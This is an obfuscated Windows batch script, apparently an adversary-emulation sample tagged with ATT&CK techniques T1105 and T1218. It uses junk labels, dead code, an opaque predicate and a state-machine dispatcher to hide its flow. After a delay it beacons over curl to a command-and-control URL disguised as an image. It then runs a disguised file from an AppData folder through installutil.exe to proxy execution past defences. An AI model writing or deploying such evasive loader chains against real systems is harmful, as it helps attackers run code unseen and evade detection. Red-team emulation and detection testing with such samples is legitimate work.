@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constant assignments (plain literals)
SET txisnba=%APPDATA%\8311\122cf464
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8311-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=illustrator.txt
SET dvhhyc=8311

REM Random variable for log file
SET fsgqty=%APPDATA%\!rrocubc!\macula-simulations.log
REM Agent name variable for logging
SET vbafok=!jwcnifl!

REM Dead code variables
SET ckcyiy=dead_value1
SET usqjmf=dead_value2
SET lpnsgb=dead_value3

REM Obfuscated control flow - state machine with random labels
SET state=0
SET mxpld=34
SET dgvjt=91
SET yrwbp=57
SET ghnvm=12

REM Initial delay 45 seconds
ping -n 45 127.0.0.1 >nul

REM State dispatcher
GOTO qwyzfn

:junk1_label
REM Never executed dead code
SET fake1=never_used
EXIT /B 1

:qwyzfn
IF !state!==0 GOTO ztmwbg
IF !state!==34 GOTO pldkvc
IF !state!==91 GOTO rtnqyj
IF !state!==57 GOTO fkxwms
IF !state!==99 GOTO mqgbcd
GOTO mqgbcd

:ztmwbg
REM Debug log: heartbeat start
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: heartbeat_start=>> "!fsgqty!" 2>nul

REM C2 heartbeat - TTP T1105 Ingress Tool Transfer
curl -k -s -o nul "!keghkgto!"

REM Debug log: heartbeat complete
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: heartbeat_complete=>> "!fsgqty!" 2>nul

REM TTP logging for T1105
SET RESULT=1
SET ERR_DETAIL=
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][!vbafok!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!RESULT!:!ERR_DETAIL!>> "!fsgqty!" 2>nul

REM Delay between operations - 8 seconds
choice /C Y /N /D Y /T 8 >nul
SET state=34
GOTO qwyzfn

:junk2_label
REM More dead code
SET fake2=unused_data
GOTO mqgbcd

:pldkvc
REM Debug log: directory change start
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: chdir_start=>> "!fsgqty!" 2>nul

REM Change to output directory
cd /d "!txisnba!"

REM Debug log: directory change complete
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: chdir_complete=>> "!fsgqty!" 2>nul

REM Random delay 15-25 seconds
SET /A delay=%RANDOM% %% 11 + 15
timeout /t !delay! /nobreak >nul
SET state=91
GOTO qwyzfn

:dead3_label
REM Unreachable code block
SET junkvar=junkdata
IF 0==0 GOTO dead3_label

:rtnqyj
REM Opaque predicate (always true)
IF 1==1 (
    GOTO real_exec
) ELSE (
    GOTO fake_exec
)

:fake_exec
REM Dead code path
EXIT /B 1

:real_exec
REM Debug log: InstallUtil execution start
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: installutil_start=>> "!fsgqty!" 2>nul

REM Execute .NET DLL via InstallUtil - TTP T1218 Signed Binary Proxy Execution
SET exec_result=0
C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U "!xzanpex!"
IF !ERRORLEVEL!==0 SET exec_result=1

REM Debug log: InstallUtil execution complete
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: installutil_complete=!exec_result!>> "!fsgqty!" 2>nul

REM TTP logging for T1218
SET RESULT=!exec_result!
IF !RESULT!==1 (
    SET ERR_DETAIL=
) ELSE (
    SET ERR_DETAIL=installutil_failed
)
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][!vbafok!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!fsgqty!" 2>nul

SET state=57
GOTO qwyzfn

:junk4_label
REM Another dead code block
FOR /L %%i IN (1,1,10) DO (
    ECHO Junk loop
)

:fkxwms
REM Debug log: cleanup start
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: cleanup_start=>> "!fsgqty!" 2>nul

REM Final delay before exit - 5 seconds
timeout /t 5 /nobreak >nul

REM Debug log: cleanup complete
SET dt=
FOR /f "delims== tokens=2" %%a IN ('wmic os get localdatetime /value 2^>nul') DO SET dt=%%a
SET logtime=!dt:~0,4!-!dt:~4,2!-!dt:~6,2! !dt:~8,2!:!dt:~10,2!:!dt:~12,2!.!dt:~15,3!
echo [!logtime!][DEBUG][!vbafok!]: cleanup_complete=>> "!fsgqty!" 2>nul

SET state=99
GOTO qwyzfn

:dead5_label
REM Final dead code block
EXIT /B 0

:mqgbcd
REM Script termination
EXIT /B 0

:junk6_label
REM More unreachable code
SET finaljunk=junk
GOTO junk6_label